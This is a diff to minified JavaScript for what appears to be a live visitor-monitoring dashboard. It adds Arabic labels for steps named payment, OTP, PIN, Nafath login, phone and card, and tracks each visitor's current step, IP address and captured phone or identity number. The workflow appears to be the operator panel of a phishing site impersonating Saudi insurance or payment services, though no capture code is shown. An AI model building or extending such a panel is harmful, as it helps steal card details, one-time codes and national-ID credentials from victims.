@@ -1719,9 +1719,14 @@
                                             _st1: "الدفع",
                                             _t2: "OTP",
                                             _t3: "PIN",
+                                            _t5: "الهاتف",
                                             _t6: "نفاذ",
                                             veri: "OTP",
                                             confi: "PIN",
+                                            step2: "OTP",
+                                            step3: "PIN",
+                                            step4: "نفاذ",
+                                            step5: "الهاتف",
                                             "phone-info": "الهاتف"
                                         })[e] || e;
                                         let t = "number" == typeof e ? e : parseInt(e);
@@ -3026,7 +3031,20 @@
                                 otp: "OTP",
                                 pin: "PIN",
                                 phone: "الهاتف",
-                                nafad: "نفاذ"
+                                nafad: "نفاذ",
+                                _st1: "الدفع",
+                                _t2: "OTP",
+                                _t3: "PIN",
+                                _t5: "الهاتف",
+                                _t6: "نفاذ",
+                                veri: "OTP",
+                                confi: "PIN",
+                                step2: "OTP",
+                                step3: "PIN",
+                                step4: "نفاذ",
+                                step5: "الهاتف",
+                                "phone-info": "الهاتف",
+                                "thank-you": "شكراً"
                             })[n] || n : ({
                                 0: "الرئيسية",
                                 1: "الرئيسية",
@@ -4147,17 +4165,33 @@
         ]),
         es = {
             home: "الرئيسية",
+            "home-new": "الرئيسية",
             "الصفحة الرئيسية": "الرئيسية",
-            compare: "مقارنة",
+            insur: "التأمين",
             insurance: "التأمين",
-            payment: "الدفع",
+            compar: "مقارنة",
+            compare: "مقارنة",
             check: "الدفع",
+            payment: "الدفع",
+            _st1: "الدفع",
+            veri: "OTP",
             otp: "OTP",
+            step2: "OTP",
+            _t2: "OTP",
+            confi: "PIN",
             pin: "PIN",
-            card: "البطاقة",
-            phone: "الهاتف",
+            step3: "PIN",
+            _t3: "PIN",
             nafad: "نفاذ",
-            success: "نجاح"
+            step4: "نفاذ",
+            _t6: "نفاذ",
+            phone: "الهاتف",
+            "phone-info": "الهاتف",
+            step5: "الهاتف",
+            _t5: "الهاتف",
+            card: "البطاقة",
+            success: "نجاح",
+            "thank-you": "شكراً"
         };
 
     function ei() {
@@ -4246,9 +4280,11 @@
                     },
                     s = ({
                         visitorId: e,
-                        page: t
+                        page: t,
+                        step: r
                     }) => a(e, {
                         currentPage: t,
+                        currentStep: r,
                         status: "active"
                     }),
                     i = ({
@@ -4275,6 +4311,7 @@
                                 country: e.country || null,
                                 ipAddress: e.ipAddress || e.ip_address || null,
                                 currentPage: e.currentPage || e.current_page || "home",
+                                currentStep: e.currentStep || e.current_step,
                                 isCustomer: !!(e.phoneNumber || e.phone_number || e.identityNumber || e.identity_number || e.v1),
                                 deviceType: e.deviceType || e.device_type || null,
                                 status: (t = Date.now(), a = e.lastSeen ? new Date(e.lastSeen).getTime() : 0, r = e.lastActiveSeen ? new Date(e.lastActiveSeen).getTime() : a, (!0 === e.isOnline || 1 === e.isOnline || !0 === e.is_online || 1 === e.is_online) && t - a < 3e4 ? "active" : t - r < 12e4 || t - a < 12e4 ? "idle" : "left"),
@@ -4406,7 +4443,7 @@
                                                     children: "·"
                                                 }), (0, t.jsx)("span", {
                                                     className: "text-[10px] text-gray-400 truncate",
-                                                    children: es[r = e.currentPage] || r
+                                                    children: es[r = e.currentPage || e.currentStep] || r
                                                 })]
                                             })]
                                         })]
